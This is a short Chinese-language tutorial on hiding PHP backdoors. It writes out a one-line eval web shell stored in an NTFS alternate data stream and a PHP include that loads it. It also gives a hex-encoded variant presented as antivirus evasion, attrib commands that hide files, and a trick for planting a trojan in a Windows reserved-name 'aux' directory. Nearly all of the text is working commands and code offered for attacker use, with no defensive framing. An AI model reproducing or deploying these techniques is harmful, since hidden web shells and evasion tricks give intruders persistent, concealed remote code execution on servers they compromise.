# <center>php 后门隐藏技巧</center>


<center><a herf="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&mid=2247487709&idx=1&sn=7c760aa3dc63f6f75042d5f6d01b4462&chksm=ec1e20f5db69a9e3c3a775d2422930daace3999bdff124580279ce24cf5da122d37c708e11f5&scene=21#wechat_redirect">php 后门隐藏技巧</a></center>
<center><a herf="https://mp.weixin.qq.com/s/PqcHvqXIZOocomGyWH1vHQ">奇淫异巧之 PHP 后门</a></center>


#####  一. attrib +s +h
* 在Linux中不存在
* attrib +s +h 文件名
      + 添加文件属性

       -  删除文件属性

       R 只读文件属性

       A 存档文件属性

       S 系统文件属性

       H 隐藏文件属性

##### 二.利用ADS隐藏文件
#### &emsp;&emsp;NTFS 交换数据流（Alternate　Data　Streams，简称 ADS）是 NTFS 磁盘格式的一个特性，在 NTFS 文件系统下，每个文件都可以存在多个数据流。通俗的理解，就是其它文件可以“寄宿”在某个文件身上，而在资源管理器中却只能看到宿主文件，找不到寄宿文件。利用 ADS 数据流，我们可以做很多有趣的事情。
1. 首先创建 ADS 隐藏文件,在命令行执行

```php
echo ^<?php @eval($_REQUEST[1]);?^> > index.php:shell.jpg
```
２．就生成了看不见的ｓｈｅｌｌ<br>
３．查看生成文件
```
dir /r

```
4.删除(删除ｉｎｄｅｘ.ｐｈｐ)
5.结合文件包含(否则利用很鸡肋)
```
<?php include('index.php:shell.jpg')?>
```
#####  二.- 免杀
把 index.php:shell.jpg hex 编码
```php
<?php
$a="696E6465782E7068703A7368656C6C2E6A7067";
// index.php:shell.jpg hex编码
$b="a";
include(PACK('H*',$$b))
?>
```

##### 利用windows保留字
* Windows 操作系统定义的设备名称，是保留关键字，不允许使用：

          CON,COM{0-9},PRN,AUX,NUL,LPT{0-9}
* 1. Windwos cmd中执行
          md aux\
* 2. 然后copy我们的马到这个目录下
              copy a.exe aux\a.exe
* 删除目录的方式
          del \\.\c:\aux\a.exe
          rd  \\.\c:aux

